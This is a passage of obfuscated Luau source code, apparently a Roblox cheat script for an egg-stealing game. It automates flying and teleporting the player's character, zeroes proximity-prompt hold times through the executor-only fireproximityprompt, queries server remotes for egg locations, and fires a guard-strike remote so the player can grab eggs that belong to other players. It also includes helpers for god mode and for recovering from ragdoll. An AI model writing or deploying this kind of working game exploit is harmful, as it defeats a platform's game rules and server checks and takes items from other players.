								Priority = arg ~= true and flag5,
							})
						end
					end
				end

				if next(tbl20) ~= nil then
					for k in pairs(tbl14) do
						if not tbl20[k] then
							tbl14[k] = nil
						end
					end

					for k in pairs(tbl15) do
						if not tbl20[k] then
							tbl15[k] = nil
						end
					end

					for k in pairs(tbl16) do
						if not tbl20[k] then
							tbl16[k] = nil
						end
					end
				end

				table.sort(tbl19, function(arg3, arg4)
					if arg3.Forced ~= nil ~= arg4.Forced ~= nil then
						return arg3.Forced ~= nil
					end

					if arg3.Forced and arg4.Forced and arg3.Forced ~= arg4.Forced then
						return arg3.Forced < arg4.Forced
					end

					if arg3.Priority ~= arg4.Priority then
						return arg3.Priority == true
					end

					if arg3.RiftOnly ~= arg4.RiftOnly then
						return arg4.RiftOnly == true
					end

					if arg3.Index ~= nil ~= arg4.Index ~= nil then
						return arg3.Index ~= nil
					end

					if arg3.Index and arg4.Index and arg3.Index ~= arg4.Index then
						return arg3.Index > arg4.Index
					end

					if v15 == tbl11[2] and arg3.Weight ~= arg4.Weight then
						return arg3.Weight > arg4.Weight
					end

					if v15 == tbl11[3] and arg3.Mutation ~= arg4.Mutation then
						return arg3.Mutation > arg4.Mutation
					end

					if v15 == tbl11[4] and arg3.Value ~= arg4.Value then
						return arg3.Value > arg4.Value
					end

					if v15 == tbl11[5] and arg3.Value ~= arg4.Value then
						return arg3.Value < arg4.Value
					end

					if arg3.Rarity ~= arg4.Rarity then
						return arg3.Rarity > arg4.Rarity
					end

					if arg3.Value ~= arg4.Value then
						return arg3.Value > arg4.Value
					end
					return tostring(arg3.Uid) < tostring(arg4.Uid)
				end)

				return tbl19
			end
		end

		local n10
		n10 = 6
		local fn20, fn21, fn22, fn23, fn24

		do
			local v20 = nil
			local connection = nil

			fn20 = function(arg, arg2, arg3, arg4, arg5)
				local n11 = arg2 - arg.Position
				local magnitude = n11.Magnitude
				local n12 = math.max(arg4, 0.0041666666666666666)
				local vector = Vector3.zero

				if magnitude > 0.01 then
					vector = n11.Unit * math.min(arg3, magnitude / n12)
				end

				local assemblyLinearVelocity = vector + Vector3.new(0, workspace.Gravity * n12 * 0.5, 0)

				if magnitude > 2 then
					if not arg5.mark then
						arg5.mark = magnitude
						arg5.clock = 0
					end

					arg5.clock = arg5.clock + arg4

					if arg5.clock >= 0.4 then
						if arg5.mark - magnitude < arg3 * 0.1 then
							pcall(function()
								arg.CFrame = arg.CFrame + n11.Unit * math.min(magnitude, arg3 * n12)
							end)
						end

						arg5.mark = magnitude
						arg5.clock = 0
					end
				else
					arg5.mark = nil
				end

				pcall(function()
					arg.AssemblyLinearVelocity = assemblyLinearVelocity
					arg.AssemblyAngularVelocity = Vector3.zero
				end)

				return magnitude <= 0.5
			end

			fn21 = function()
				local v21 = tbl4.Root()

				if v21 then
					pcall(function()
						v21.AssemblyLinearVelocity = Vector3.zero
						v21.AssemblyAngularVelocity = Vector3.zero
					end)
				end
			end

			local connection2 = nil
			local tbl19 = {}

			fn22 = function()
				v20 = nil

				if connection then
					connection:Disconnect()
					connection = nil
				end

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end

			fn23 = function()
				local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
				return num ~= nil and num > workspace:GetServerTimeNow()
			end

			local flag3 = false

			local function fn25()
				if flag3 then
					return true
				end
				return true
			end

			fn24 = function(arg, arg2)
				v20 = arg
				flag3 = arg2 == true
				if connection or not arg then
					return
				end
				tbl19 = {}

				connection = RunService.Heartbeat:Connect(function()
					if not v20 or fn25() or fn23() or tbl4.AntiGuard.Busy then
						return
					end
					local v21 = tbl4.Root()
					if not v21 then
						return
					end

					pcall(function()
						local rotation = v21.CFrame.Rotation
						v21.CFrame = CFrame.new(v20) * rotation
						v21.AssemblyLinearVelocity = Vector3.zero
						v21.AssemblyAngularVelocity = Vector3.zero
					end)
				end)

				connection2 = RunService.PreSimulation:Connect(function(deltaTime)
					if not v20 or not fn25() or fn23() or tbl4.AntiGuard.Busy then
						return
					end
					local v21 = tbl4.Root()

					if v21 then
						fn20(v21, v20, n2, deltaTime, tbl19)
					end
				end)
			end
		end

		fn4(fn22)
		local fn25

		fn25 = function()
			fn22()
			tbl4.EndFlight()
			tbl4.GodMode(false)
			local character = localPlayer.Character
			character = character and character:FindFirstChildOfClass("Humanoid")

			if character then
				character.PlatformStand = false
			end
		end

		local n11, fn26, fn27

		do
			local n12 = 1.5
			n11 = 0.6

			local function fn28(arg, arg2)
				local x = arg2.X
				return (Vector3.new(arg.X, 0, arg.Z) - Vector3.new(x, 0, arg2.Z)).Magnitude
			end

			local function fn29(arg)
				local ok, result = pcall(function()
					return arg:GetPivot().Position
				end)

				return ok and result or nil
			end

			fn26 = function(arg, arg2, arg3)
				local v20 = fn28(arg.Position, arg3)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				if not areaEggSlotsClient then
					return true
				end

				for _, child in ipairs(areaEggSlotsClient:GetChildren()) do
					if child:IsA("Model") and child.Name ~= arg2 then
						local v21 = fn29(child)
						if v21 and fn28(v21, arg.Position) + n12 < v20 then
							return false
						end
					end
				end

				return true
			end

			fn27 = function(arg, arg2, arg3)
				local n13 = arg3 or 14
				local v20 = nil
				local v21

				for _, child in ipairs(workspace:GetChildren()) do
					if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
						local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")

						if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
							local v22 = fn28(child.Position, arg2)

							if v22 < n13 then
								n13 = v22
								v20 = carryAreaEgg
								v21 = child
							end
						end
					end
				end

				if not v20 or not v21 then
					return nil
				end

				if type(arg) == "string" and not fn26(v21, arg, arg2) then
					return nil
				end
				return v20, v21
			end
		end

		local fn28

		fn28 = function(arg)
			local eggState = tbl.EggState

			if type(arg) == "string" and type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
				pcall(eggState.CarryFieldEgg, arg)
			end
		end

		local fn29

		do
			local function fn30()
				local carryUid = tbl4.Steal.CarryUid
				return type(carryUid) == "string" and carryUid or nil
			end

			local function fn31(arg)
				local v20 = fn30()
				if not v20 or type(arg) ~= "string" then
					return true
				end
				return v20 == arg
			end

			local function fn32(arg)
				if type(arg) ~= "string" then
					return false
				end
				local v20 = fn19(false, true)
				if #v20 == 0 then
					return true
				end

				for _, v21 in ipairs(v20) do
					if v21.Uid == arg then
						return true
					end
				end

				return false
			end

			local function fn33(arg)
				local eggState = tbl.EggState

				if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
					pcall(eggState.DropFieldEgg, "PlayerRequest")
				end

				local n12 = 0

				while tbl4.Steal.Carrying and n12 < 1 and not fn13(arg) do
					n12 += RunService.Heartbeat:Wait()
				end
			end

			fn29 = function(arg, arg2)
				local n12 = 0

				while not tbl4.Steal.Carrying and n12 < n11 and not fn13(arg2) do
					n12 += RunService.Heartbeat:Wait()
				end

				if not tbl4.Steal.Carrying then
					str2 = "The egg never reached the hand"
					return false
				end

				if fn31(arg) then
					return true
				end
				local v20 = fn30()
				if fn32(v20) then
					str2 = "Holding another egg that still matches, delivering it"
					return true
				end
				str2 = "Wrong egg in hand, dropping it"
				fn33(arg2)
				return false
			end
		end

		local fn30

		fn30 = function(arg, arg2)
			local eggState = tbl.EggState
			local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
			if not position then
				return false
			end
			local n12 = 0
			local huge = math.huge
			local n13 = 0

			while n12 < 1.5 do
				if fn13(arg2) then
					return false
				end

				if tbl4.Steal.Carrying then
					return true
				end

				if huge >= 0.06 then
					local v20 = fn27(arg.Uid, position)

					if v20 then
						pcall(function()
							v20.HoldDuration = 0
						end)

						n13 = 0

						if typeof(fireproximityprompt) == "function" then
							pcall(fireproximityprompt, v20)
						end
					else
						n13 += 1
						if n13 >= 4 then
							return false
						end

						if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
							pcall(eggState.CarryFieldEgg, arg.Uid)
						end
					end

					huge = 0
				end

				local result = RunService.Heartbeat:Wait()
				n12 += result
				huge += result
			end

			return tbl4.Steal.Carrying == true
		end

		local fn31, fn32, n12, n13

		do
			local v20 = fn2(function()
				return ReplicatedStorage.Shared.Modules.Ragdoll
			end)

			local function fn33()
				local character = localPlayer.Character

				if type(v20) == "table" and type(v20.IsRagdolled) == "function" then
					local ok, result = pcall(v20.IsRagdolled, character)
					if ok and result == true then
						return true
					end
				end

				local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
				if num and num > workspace:GetServerTimeNow() then
					return true
				end
				character = character and character:FindFirstChildOfClass("Humanoid")
				if character then
					local state = character:GetState()
					return state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
				end
				return false
			end

			fn31 = function(arg, arg2)
				if tbl4.Steal.Carrying then
					return true
				end
				local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
				if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
					return false
				end
				local n14 = 0

				while n14 < 1 do
					if fn13(arg2) or tbl4.Steal.Carrying then
						return tbl4.Steal.Carrying == true
					end
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
					local records = ok and type(result) == "table" and result.Records or nil

					if type(records) == "table" then
						local flag3 = false

						for _, record in pairs(records) do
							if type(record) == "table" and record.Uid == arg and (record.State == "Slot" or record.State == "Dropped") then
								flag3 = true
								break
							end
						end

						if not flag3 then
							return tbl4.Steal.Carrying == true
						end
					end

					n14 += task.wait(0.3)
				end

				return tbl4.Steal.Carrying == true
			end

			local function fn34(arg)
				local v21 = tbl4.Root()
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not v21 or not position then
					return math.huge
				end
				return (v21.Position - position).Magnitude
			end

			fn32 = function(arg)
				local huge = math.huge
				local v21 = nil

				for _, v22 in ipairs(arg) do
					local v23 = fn34(v22)

					if v23 < huge then
						huge = v23
						v21 = v22
					end
				end

				return v21, huge
			end

			n12 = 20
			n13 = 90
			local n14 = 6

			local function fn35(arg, arg2, arg3, arg4, arg5, arg6)
				fn22()
				local v21 = tbl4.Root()
				if not v21 then
					return false
				end
				local character = localPlayer.Character
				local position = v21.Position
				local tbl19 = {}
				local position2 = nil
				local flag3 = nil
				local str3 = nil
				local n15 = 0

				local function fn36()
					if arg4 ~= nil then
						return true
					end
					return true
				end

				local function fn37(arg7)
					n15 += arg7
					if fn13(arg2) then
						flag3 = false
						return nil
					end

					if arg3 and not tbl4.Steal.Carrying then
						flag3 = false
						str3 = "dropped"
						return nil
					end

					if arg6 then
						local v22 = arg6()

						if v22 then
							flag3 = false
							str3 = v22
							return nil
						end
					end

					local v22 = tbl4.Root()

					if not v22 or n15 >= 25 or localPlayer.Character ~= character then
						flag3 = false
						str3 = "respawned"
						return nil
					end

					return v22
				end

				local connection = RunService.Heartbeat:Connect(function(deltaTime)
					if flag3 ~= nil or fn36() or tbl4.AntiGuard.Busy then
						return
					end
					local v22 = fn37(deltaTime)
					if not v22 then
						return
					end

					if n10 < (v22.Position - position).Magnitude then
						if arg5 then
							flag3 = false
							str3 = "displaced"
							return
						end

						position = v22.Position
					end

					local v23 = arg4 or n
					local n16 = arg - position
					local n17 = v23 * deltaTime
					local flag4 = n16.Magnitude <= math.max(n17, 0.05)
					position = flag4 and arg or position + n16.Unit * n17
					local vector = Vector3.new(n16.X, 0, n16.Z)
					local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or v22.CFrame.Rotation

					pcall(function()
						v22.CFrame = CFrame.new(position) * cframe
						v22.AssemblyLinearVelocity = Vector3.zero
						v22.AssemblyAngularVelocity = Vector3.zero
					end)

					if flag4 then
						flag3 = true
					end
				end)

				local connection2 = RunService.PreSimulation:Connect(function(deltaTime)
					if flag3 ~= nil or not fn36() or tbl4.AntiGuard.Busy then
						return
					end
					local v22 = fn37(deltaTime)
					if not v22 then
						return
					end
					local v23 = arg4 or n

					if arg5 and position2 and (v22.Position - position2).Magnitude > n10 + v23 * deltaTime then
						flag3 = false
						str3 = "displaced"
						return
					end

					if fn20(v22, arg, v23, deltaTime, tbl19) then
						flag3 = true
					end

					position2 = v22.Position
					position = v22.Position
				end)

				while flag3 == nil do
					RunService.Heartbeat:Wait()
				end

				connection:Disconnect()
				connection2:Disconnect()

				if fn36() and not flag3 then
					fn21()
				end

				if flag3 then
					fn24(arg, arg4 ~= nil)
				end

				return flag3, str3
			end

			local tbl19 = {
				{
					Path = { "GearGiver_Slap", "Podium" },
					Offset = Vector3.new(-16.415, 21.072, -6.106),
				},
				{
					Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
					Offset = Vector3.new(-26.776, 1.75, 18.665),
				},
				{
					Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
					Offset = Vector3.new(-26.776, 1.75, 18.665),
				},
			}

			local function stealHome()
				for _, v21 in ipairs(tbl19) do
					local v22 = workspace

					for _, v23 in ipairs(v21.Path) do
						v22 = v22 and v22:FindFirstChild(v23) or nil
					end

					if v22 and v22:IsA("BasePart") then
						return v22.CFrame:PointToWorldSpace(v21.Offset)
					end
				end

				return Vector3.new(528.7, 70.57, -364.11)
			end

			tbl4.StealHome = stealHome

			tbl4.InsideBase = function(arg)
				if not arg then
					arg = tbl4.Root()
					arg = arg and arg.Position
				end

				if arg == nil then
					return false
				end
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				local separationLine = world and world:FindFirstChild("SeparationLine")
				return arg.X < (separationLine and separationLine:IsA("BasePart") and separationLine.Position.X or 552)
			end

			local function fn36(arg)
				if tbl4.AntiGuard.Busy then
					return false
				end
				local character = localPlayer.Character
				local v21 = tbl4.Root()
				if not character or not v21 then
					return false
				end
				local rotation = v21.CFrame.Rotation
				local cFrame = CFrame.new(arg) * rotation

				pcall(function()
					character:PivotTo(cFrame)
				end)

				if (v21.Position - arg).Magnitude > 3 then
					pcall(function()
						v21.CFrame = cFrame
					end)
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") then
						pcall(function()
							descendant.AssemblyLinearVelocity = Vector3.zero
							descendant.AssemblyAngularVelocity = Vector3.zero
						end)
					end
				end

				return true
			end

			local function fn37(arg)
				if tbl4.AntiGuard.Busy then
					return
				end
				local character = localPlayer.Character
				local v21 = tbl4.Root()
				if not character or not v21 or not arg then
					return
				end

				if (v21.Position - arg).Magnitude > 6 then
					fn36(arg)
					return
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") and descendant ~= v21 and (descendant.Position - v21.Position).Magnitude > 12 then
						pcall(function()
							descendant.CFrame = v21.CFrame
							descendant.AssemblyLinearVelocity = Vector3.zero
						end)
					end
				end
			end

			local function fn38(arg, arg2)
				local n15 = 0

				while true do
					if not (n15 < n14) then
						return not fn13(arg)
					else
						if fn13(arg) then
							break
						end
						local character = localPlayer.Character
						local flag3 = fn33()

						if not flag3 and character then
							for _, descendant in ipairs(character:GetDescendants()) do
								if descendant:IsA("Constraint") and string.find(descendant.Name, "RagdollConstraint", 1, true) then
									flag3 = true
									break
								end
							end
						end

						if not flag3 then
							return not fn13(arg)
						end
						fn37(arg2)
						n15 += RunService.Heartbeat:Wait()
					end
				end

				return false
			end

			local function fn39(arg)
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("GuardAreas")
				local areaId = world and arg and arg.AreaId and world:FindFirstChild(arg.AreaId)
				return areaId and areaId:FindFirstChild("Guard") or nil
			end

			local function fn40(arg)
				local v21 = fn39(arg)
				return v21 ~= nil and v21:GetAttribute("GuardState") == "Sleeping"
			end

			local n15 = 3

			local function fn41(arg)
				local v21 = fn39(arg)
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not v21 or not position then
					return nil, nil
				end

				local ok, result = pcall(function()
					return v21:GetPivot().Position
				end)

				if not ok then
					return nil, nil
				end
				local vector = Vector3.new(position.X - result.X, 0, position.Z - result.Z)
				if vector.Magnitude < 0.1 then
					return nil, nil
				end
				local n16 = result + vector.Unit * n15
				return Vector3.new(n16.X, position.Y + 3, n16.Z), result
			end

			local function fn42(arg, arg2)
				local tbl20 = { Landed = false, Destination = arg2 }
				local antiGuard = tbl4.AntiGuard
				antiGuard.HitArms = antiGuard.HitArms + 1
				tbl4.AntiGuard.HitArmedAt = os.clock()

				tbl20.Link = localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
					if tbl20.Landed or fn13(arg) then
						return
					end
					local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
					if not num or num <= workspace:GetServerTimeNow() then
						return
					end
					local v21 = tbl4.Root()
					if not v21 then
						return
					end
					tbl20.Landed = true
					fn22()

					pcall(function()
						v21.CFrame = CFrame.new(tbl20.Destination)
						v21.AssemblyLinearVelocity = Vector3.zero
					end)
				end)

				tbl20.Stop = function()
					if tbl20.Link then
						tbl20.Link:Disconnect()
						tbl20.Link = nil
						tbl4.AntiGuard.HitArms = math.max(0, tbl4.AntiGuard.HitArms - 1)
					end
				end

				return tbl20
			end

			local function fn43(arg, arg2, arg3)
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")

				if character then
					character.PlatformStand = false
				end

				local n16 = 0
				local v21 = nil

				while not arg2.Landed and n16 < n12 do
					if fn13(arg) then
						break
					end

					if arg3 then
						arg3(arg2)
					end

					if not tbl4.Steal.Carrying then
						v21 = v21 or n16
						if n16 - v21 > 1 then
							break
						end
					end

					n16 += RunService.Heartbeat:Wait()
				end

				arg2.Stop()
				return arg2.Landed
			end

			local n16 = 20

			local function fn44(arg, arg2, arg3, arg4)
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not position then
					return false
				end
				local n17 = 0
				local huge = math.huge

				while n17 < arg3 do
					if fn13(arg2) then
						return false
					end

					if tbl4.Steal.Carrying then
						return true
					end

					if huge >= 0.1 then
						local v21 = fn27(arg.Uid, position)

						if v21 then
							pcall(function()
								v21.HoldDuration = 0
							end)

							if typeof(fireproximityprompt) == "function" then
								pcall(fireproximityprompt, v21)
							end
						else
							fn28(arg.Uid)
						end

						huge = 0
					end

					if arg4 then
						fn37(arg4)
					end

					local result = RunService.Heartbeat:Wait()
					n17 += result
					huge += result
				end

				return tbl4.Steal.Carrying == true
			end

			local function fn45(arg, arg2, arg3, arg4)
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not position then
					return false
				end
				local n17 = position + Vector3.new(0, 3, 0)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid and character:FindFirstChildWhichIsA("Tool") then
					pcall(function()
						humanoid:UnequipTools()
					end)
				end

				if arg3 then
					fn24(n17, true)
					str2 = "Waiting to stand up"
					if not fn38(arg2, n17) then
						return false
					end
				else
					str2 = "Jumping to the egg"
					local v21 = tbl4.Root()

					if v21 and (n17 - v21.Position).Magnitude <= n13 then
						pcall(function()
							local rotation = v21.CFrame.Rotation
							v21.CFrame = CFrame.new(n17) * rotation
							v21.AssemblyLinearVelocity = Vector3.zero
							v21.AssemblyAngularVelocity = Vector3.zero
						end)
					elseif not fn35(n17, arg2, nil, n2) then
						return false
					end
				end

				if fn13(arg2) then
					return false
				end
				local flag3 = arg4 and typeof(arg4.CFrame) == "CFrame"
				local v21 = nil

				if flag3 then
					v21 = fn42(arg2, arg4.CFrame.Position + Vector3.new(0, 3, 0))
				end

				local str3 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
				local flag4 = type(arg.Uid) == "string" and string.sub(arg.Uid, 1, #str3) == str3 and string.match(arg.Uid, "_([%w ]+:Slot_%d+)$") or nil
				arg4 = arg4 and flag4
				local flag5 = false

				if arg4 then
					local eggState = tbl.EggState

					if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
						str2 = "Taking the starter egg"

						task.spawn(function()
							pcall(eggState.CarryFieldEgg, arg.Uid, flag4)
						end)

						local n18 = 0

						while not tbl4.Steal.Carrying and n18 < 0.8 do
							if fn13(arg2) then
								return false
							end
							n18 += RunService.Heartbeat:Wait()
						end

						flag5 = tbl4.Steal.Carrying == true
					end
				end

				if not flag5 then
					str2 = "Taking the egg"
					flag5 = fn30(arg, arg2)

					if not flag5 and not fn13(arg2) then
						fn35(n17, arg2, nil, n2)
						flag5 = fn30(arg, arg2)
					end
				end

				if not flag5 and not fn31(arg.Uid, arg2) then
					if v21 then
						v21.Stop()
					end

					tbl18[arg.Uid] = os.clock() + n7
					str2 = "That egg would not come free"
					return false
				end

				if v21 then
					local reGuardPatrolForestStrike = networking:FindFirstChild("RE/GuardPatrol/ForestStrike")
					local v22 = fn39(arg) or fn39({ AreaId = "Forest" })
					local humanoidRootPart = v22 and v22:FindFirstChild("HumanoidRootPart")

					if reGuardPatrolForestStrike and reGuardPatrolForestStrike:IsA("RemoteEvent") and humanoidRootPart then
						str2 = "Calling the guard strike"

						pcall(function()
							reGuardPatrolForestStrike:FireServer({ EggUid = arg.Uid, GuardCFrame = humanoidRootPart.CFrame })
						end)
					end
				end

				tbl4.Steal.LastFinishedAt = os.clock()
				return true, v21
			end

			local n17 = 3
			local n18 = 30

			local function fn46(arg, arg2, arg3)
				local v21 = nil
				local v22 = nil

				for _, child in ipairs(workspace:GetChildren()) do
					if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
						local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")

						if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
							local magnitude = (child.Position - arg).Magnitude

							if magnitude < arg2 then
								arg2 = magnitude
								v21 = carryAreaEgg
								v22 = child
							end
						end
					end
				end

				if v21 and v22 and type(arg3) == "string" and not fn26(v22, arg3, arg) then
					return nil
				end
				return v21, v22
			end

			local function fn47(arg)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				local v21 = workspace:FindFirstChild(arg) or areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)
				if not v21 then
					return nil
				end

				local ok, result = pcall(function()
					return v21:GetPivot().Position
				end)

				return ok and result or nil
			end

			local function fn48(arg)
				local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
				if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
					return nil
				end
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
				local records = ok and type(result) == "table" and result.Records or nil
				if type(records) ~= "table" then
					return nil
				end

				for _, record in pairs(records) do
					if type(record) == "table" and record.Uid == arg and typeof(record.BottomCFrame) == "CFrame" then
						return record.BottomCFrame.Position
					end
				end

				return nil
			end

			local function fn49(arg)
				local v21 = workspace:FindFirstChild(arg)
				if not v21 then
					return false
				end

				for _, descendant in ipairs(v21:GetDescendants()) do
					if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
						local ok, result, result2 = pcall(function()
							return descendant.Part0, descendant.Part1
						end)

						if ok then
							for _, v22 in ipairs({ result, result2 }) do
								if typeof(v22) == "Instance" and not v22:IsDescendantOf(v21) then
									local model = v22:FindFirstAncestorOfClass("Model")
									if model and model ~= localPlayer.Character and Players:GetPlayerFromCharacter(model) then
										return true
									end
								end
							end
						end
					end
				end

				return false
			end

			local function fn50(arg, arg2)
				local carryUid = arg2 or tbl4.Steal.CarryUid
				if type(carryUid) ~= "string" then
					return false
				end
				fn22()
				str2 = "Following the egg"
				local n19 = nil
				local vector = Vector3.zero

				local connection = RunService.PreSimulation:Connect(function(deltaTime)
					local v21 = tbl4.Root()
					if not v21 or not n19 or tbl4.Steal.Carrying or fn13(arg) then
						return
					end

					if fn23() then
						if (v21.Position - n19).Magnitude > 2 then
							fn36(n19)
						end

						return
					end

					local n20 = math.max(deltaTime, 0.0041666666666666666)
					local n21 = vector + (n19 - v21.Position) / math.max(0.08, n20)
					local n22 = n2 + vector.Magnitude

					if n22 < n21.Magnitude then
						n21 = n21.Unit * n22
					end

					local assemblyLinearVelocity = n21 + Vector3.new(0, workspace.Gravity * n20 * 0.5, 0)

					pcall(function()
						v21.AssemblyLinearVelocity = assemblyLinearVelocity
						v21.AssemblyAngularVelocity = Vector3.zero
					end)
				end)

				local n20 = 0
				local huge = math.huge
				local v21 = nil
				local v22 = nil
				local n21 = 0
				local huge2 = math.huge
				local n22 = 0
				local flag3

				while true do
					flag3 = false

					if not (n20 < n18) then
						break
					else
						if not fn13(arg) then
							if tbl4.Steal.Carrying then
								flag3 = true
								break
							else
								local v23 = tbl4.Root()

								if v23 then
									local v24 = fn47(carryUid)
									local now, flag4, n23, flag5, v25, result

									if not v24 and huge >= 0.5 then
										v24 = fn48(carryUid)
										local n24 = 0

										if v24 then
											huge = n24

											if v24 then
												now = os.clock()
												flag4 = v21 and v22 and now > v22

												if flag4 then
													n23 = (v24 - v21) / math.max(now - v22, 0.0041666666666666666)

													if n23.Magnitude < 3000 then
														vector = vector:Lerp(n23, 0.3)
													end
												end

												n19 = v24 + Vector3.new(0, 3, 0)
												v21 = v24
												v22 = now
											end

											if n21 >= 0.4 then
												n21 = 0

												if fn49(carryUid) then
													str2 = "Another player took the egg"
													break
												else
													flag5 = n19 and (n19 - v23.Position).Magnitude <= n16 and huge2 >= 0.1

													if flag5 then
														v25 = fn46(n19 - Vector3.new(0, 3, 0), 6, carryUid)

														if v25 then
															pcall(function()
																v25.HoldDuration = 0
															end)

															huge2 = 0
															n22 = 0

															if typeof(fireproximityprompt) == "function" then
																pcall(fireproximityprompt, v25)
															end

															result = RunService.Heartbeat:Wait()
															n20 += result
															huge2 += result
															huge += result
															n21 += result
															continue
														else
															n22 += 1
															huge2 = 0

															if not (n22 >= 20) then
																result = RunService.Heartbeat:Wait()
																n20 += result
																huge2 += result
																huge += result
																n21 += result
																continue
															else
																break
															end
														end
													else
														result = RunService.Heartbeat:Wait()
														n20 += result
														huge2 += result
														huge += result
														n21 += result
														continue
													end
												end
											else
												flag5 = n19 and (n19 - v23.Position).Magnitude <= n16 and huge2 >= 0.1

												if flag5 then
													v25 = fn46(n19 - Vector3.new(0, 3, 0), 6, carryUid)

													if v25 then
														pcall(function()
															v25.HoldDuration = 0
														end)

														huge2 = 0
														n22 = 0

														if typeof(fireproximityprompt) == "function" then
															pcall(fireproximityprompt, v25)
														end

														result = RunService.Heartbeat:Wait()
														n20 += result
														huge2 += result
														huge += result
														n21 += result
														continue
													else
														n22 += 1
														huge2 = 0

														if not (n22 >= 20) then
															result = RunService.Heartbeat:Wait()
															n20 += result
															huge2 += result
															huge += result
															n21 += result
															continue
														else
															break
														end
													end
												else
													result = RunService.Heartbeat:Wait()
													n20 += result
													huge2 += result
													huge += result
													n21 += result
													continue
												end
											end
										end
									else
										if v24 then
											now = os.clock()
											flag4 = v21 and v22 and now > v22

											if flag4 then
												n23 = (v24 - v21) / math.max(now - v22, 0.0041666666666666666)

												if n23.Magnitude < 3000 then
													vector = vector:Lerp(n23, 0.3)
												end
											end

											n19 = v24 + Vector3.new(0, 3, 0)
											v21 = v24
											v22 = now
										end

										if n21 >= 0.4 then
											n21 = 0

											if fn49(carryUid) then
												str2 = "Another player took the egg"
												break
											else
												flag5 = n19 and (n19 - v23.Position).Magnitude <= n16 and huge2 >= 0.1

												if flag5 then
													v25 = fn46(n19 - Vector3.new(0, 3, 0), 6, carryUid)

													if v25 then
														pcall(function()
															v25.HoldDuration = 0
														end)

														huge2 = 0
														n22 = 0

														if typeof(fireproximityprompt) == "function" then
															pcall(fireproximityprompt, v25)
														end

														result = RunService.Heartbeat:Wait()
														n20 += result
														huge2 += result
														huge += result
														n21 += result
														continue
													else
														n22 += 1
														huge2 = 0

														if not (n22 >= 20) then
															result = RunService.Heartbeat:Wait()
															n20 += result
															huge2 += result
															huge += result
															n21 += result
															continue
														else
															break
														end
													end
												else
													result = RunService.Heartbeat:Wait()
													n20 += result
													huge2 += result
													huge += result
													n21 += result
													continue
												end
											end
										else
											flag5 = n19 and (n19 - v23.Position).Magnitude <= n16 and huge2 >= 0.1

											if flag5 then
												v25 = fn46(n19 - Vector3.new(0, 3, 0), 6, carryUid)

												if v25 then
													pcall(function()
														v25.HoldDuration = 0
													end)

													huge2 = 0
													n22 = 0

													if typeof(fireproximityprompt) == "function" then
														pcall(fireproximityprompt, v25)
													end

													result = RunService.Heartbeat:Wait()
													n20 += result
													huge2 += result
													huge += result
													n21 += result
													continue
												else
													n22 += 1
													huge2 = 0

													if not (n22 >= 20) then
														result = RunService.Heartbeat:Wait()
														n20 += result
														huge2 += result
														huge += result
														n21 += result
														continue
													else
														break
													end
												end
											else
												result = RunService.Heartbeat:Wait()
												n20 += result
												huge2 += result
												huge += result
												n21 += result
												continue
											end
										end
									end
								end
							end
						end

						break
					end
				end

				connection:Disconnect()
				fn21()
				return flag3 or tbl4.Steal.Carrying == true
			end

			local function fn51(arg, arg2)
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not position then
					return false
				end

				if tbl4.InsideBase() and not tbl4.InsideBase(position) then
					local v21 = stealHome()

					if v21 then
						str2 = "Leaving the base through the safe zone"
						if not fn35(v21 + Vector3.new(0, 3, 0), arg2, nil, n2) then
							return false
						end
					end
				end

				str2 = "Flying to the egg"
